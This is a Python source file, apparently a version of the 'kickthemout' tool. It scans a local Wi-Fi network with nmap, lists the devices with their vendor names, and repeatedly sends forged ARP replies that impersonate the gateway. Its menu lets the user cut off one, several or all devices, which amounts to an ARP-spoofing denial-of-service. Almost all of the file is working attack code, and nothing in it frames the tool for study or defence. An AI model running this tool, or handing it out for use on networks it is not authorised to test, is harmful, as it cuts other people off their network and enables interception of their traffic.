import time,os,sys,logging, math,re,netifaces,socket, netaddr,subprocess,struct
from time import sleep
import urllib2 as urllib
import traceback
import timeit
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

logging.getLogger("Scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    #import scan,spoof
except:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
    raise SystemExit

def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    # Function for sending the malicious ARP packets out with the specified data
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac
    ether.dst = target_mac

    arp.op = 2

    def broadcastPacket():
        packet = ether / arp
        sendp(x=packet, verbose=False)

    broadcastPacket()

def getDefaultInterface():
    #ifaces = netifaces.interfaces()
    myiface = 'wlan0'
    addrs = netifaces.ifaddresses(myiface)
    ipinfo = addrs[socket.AF_INET][0]
    address = ipinfo['addr']
    netmask = ipinfo['netmask']
    cidr = netaddr.IPNetwork('%s/%s' % (address, netmask))
    network = cidr.network
    cidr_gate = netaddr.IPNetwork('%s/%s' % (network, netmask))
    return cidr_gate


def scan(network):
    network= str(network)
    nmap = subprocess.Popen(('nmap','-oX','-', '-sP',network ), stdout=subprocess.PIPE)
    ipout = nmap.communicate()[0]
    ipout=ipout.split("<host>")
    addrs=[]
    for i in ipout:
        k1=re.findall('<address addr="(.*?)" addrtype="ipv4"/>\n<address addr="(.*?)" addrtype="mac"/>',i)
        try:
            k1=list(k1[0])
            addrs.append(k1)
        except:
            pass
    stop = timeit.default_timer()
    return addrs[::-1]


def scanNetwork():
    global hostsList
    try:
        # call scanning function
        hostsList = scan(getDefaultInterface())
        print hostsList
    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.\nCatch ya later!{1}').format(GREEN, END)
        raise SystemExit
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n").format(RED, END)
        raise SystemExit
    regenOnlineIPs()

def getGatewayIP():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def getDefaultInterfaceMAC():
    k= netifaces.ifaddresses('wlan0')[netifaces.AF_LINK]
    k=k[0]["addr"]
    return k


def resolveMac(mac):
    try:
        # sen request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def runDebug():
    print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
    print(
    "{0}Starting debug... (report this crash {1}").format(
        RED, END)
    print("{0}").format(RED)
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to print defaultGatewayMac...")
    try:
        print ("Reloading mac getter function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to reload mac getter function / to print defaultGatewayMac...")
    try:
        print ("Known gateway IP: " + defaultGatewayIP)
    except:
        print ("Failed to print defaultGatewayIP...")
    try:
        print ("Current hostslist array: ")
        print hostsList
    except:
        print ("Failed to print hostsList array...")
    try:
        print ("Crash trace: ")
        print(traceback.format_exc())
    except:
        print ("Failed to print crash trace...")
    print ("DEBUG FINISHED.\nShutting down...")
    print("{0}").format(END)
    raise SystemExit



def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ("{0}kickthemout{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = raw_input()
        defaultGatewayMacSet = True


# display options
def optionBanner():
    print('\nChoose option from menu:\n')
    sleep(0.2)
    print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Kick ALL Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)



def kickoneoff():
    os.system("clear||cls")

    print("\n{0}kickONEOff{1} selected...{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()


    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = int(raw_input("\nChoose a target: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}").format(RED, END)

    # locate MAC of specified device
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\n{0}Target: {1}" + one_target_ip).format(GREEN, END)

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)

def kicksomeoff():
    os.system("clear||cls")

    print("\n{0}kickSOMEOff{1} selected...{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t" + vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\n{0}ERROR: Please select more than 1 devices from the list.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            return

    some_ipList = ""
    for i in some_targets:
        try:
            some_ipList += GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: '{1}" + i + "{2}' is not in the list.{3}\n").format(RED, GREEN, RED, END)
            return
    some_ipList = some_ipList[:-2] + END

    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)



# kick all devices
def kickalloff():
    os.system("clear||cls")

    print("\n{0}kickALLOff{1} selected...{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        # broadcast malicious ARP packets (10p/s)
        reScan = 0
        while True:
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # dodge gateway
                        sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)




def main():

    # display heading


    print(
        "\n{0}Using interface '{1}" + str(defaultInterface) + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
        + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN,
                                                                                                RED, GREEN, RED, GREEN, END)
    # display warning in case of no active hosts
    if len(hostsList) == 0 or len(hostsList) == 1:
        if len(hostsList) == 1:
            if hostsList[0][0] == defaultGatewayIP:
                print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
                    GREEN, RED, GREEN, RED, GREEN, END)
                raise SystemExit
        else:
            print(
            "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
                GREEN, RED, GREEN, RED, GREEN, END)
            print(
            "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
                RED, BLUE, END)
            raise SystemExit

    try:

        while True:

            optionBanner()

            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}Thanks for dropping by.'
                      '\nCatch ya later!{1}').format(GREEN, END)
                raise SystemExit
            elif choice == '1':
                kickoneoff()
            elif choice == '2':
                kicksomeoff()
            elif choice == '3':
                kickalloff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.'
              '\nCatch ya later!{1}').format(GREEN, END)

if __name__ == '__main__':

    # configure appropriate network info
    sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    global defaultGatewayMacSet
    defaultGatewayMacSet = False

    # commence scanning process
    scanNetwork()
    main()
